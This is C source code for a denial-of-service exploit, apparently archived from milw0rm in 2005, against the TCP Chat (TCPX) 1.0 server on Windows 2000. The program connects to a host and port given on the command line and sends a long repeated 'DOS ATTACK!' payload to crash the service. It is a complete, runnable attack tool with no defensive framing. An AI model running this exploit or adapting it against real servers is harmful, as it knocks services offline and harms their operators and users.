/*

TCP Chat(TCPX) DoS Exploit
----------------------------------------

Resolve host... [OK]
[+] Connecting... [OK]
Target locked
Sending bad procedure... [OK]
[+] Server DoS'ed

Tested on Windows2000 SP4
Info: infamous.2hell.com / basher13@linuxmail.org

*/

#include <string.h>
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

char doscore[] =
"*** TCP Chat 1.0 DOS Exploit \n"
"***-----------------------------------------------\n"
"*** Infam0us Gr0up - Securiti Research Team \n\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n";


int main(int argc, char *argv[])
{
WSADATA wsaData;
WORD wVersionRequested;
struct hostent *pTarget;
struct sockaddr_in sock;
char *target;
int port,bufsize;
SOCKET inetdos;

if (argc < 2)
{
printf(" TCP Chat(TCPX) DoS Exploit \n", argv[0]);
printf(" ------------------------------------------\n", argv[0]);
printf(" Infam0us Gr0up - Securiti Research\n\n", argv[0]);
printf("[-]Usage: %s [target] [port]\n", argv[0]);
printf("[?]Exam: %s localhost 1234\n", argv[0]);
exit(1);
}

wVersionRequested = MAKEWORD(1, 1);
if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;

target = argv[1];
port = 1234;

if (argc >= 3) port = atoi(argv[2]);
bufsize = 1024;
if (argc >= 4) bufsize = atoi(argv[3]);

inetdos = socket(AF_INET, SOCK_STREAM, 0);
if(inetdos==INVALID_SOCKET)
{
printf("Socket ERROR \n");
exit(1);
}
printf(" TCP Chat(TCPX) DoS Exploit \n", argv[0]);
printf(" ------------------------------------------\r\n\n", argv[0]);
printf("Resolve host... ");
if ((pTarget = gethostbyname(target)) == NULL)
{
printf("FAILED \n", argv[0]);
exit(1);
}
printf("[OK]\n ");
memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
sock.sin_family = AF_INET;
sock.sin_port = htons((USHORT)port);

printf("[+] Connecting... ");
if ( (connect(inetdos, (struct sockaddr *)&sock, sizeof (sock) )))
{
printf("FAILED\n");
exit(1);
}
printf("[OK]\n");
printf("Target locked\n");
printf("Sending bad procedure... ");
if (send(inetdos, doscore, sizeof(doscore)-1, 0) == -1)
{
printf("ERROR\n");
closesocket(inetdos);
exit(1);
}
printf("[OK]\n ");
printf("[+] Server DoS'ed\n");
closesocket(inetdos);
WSACleanup();
return 0;
}

// milw0rm.com [2005-07-06]
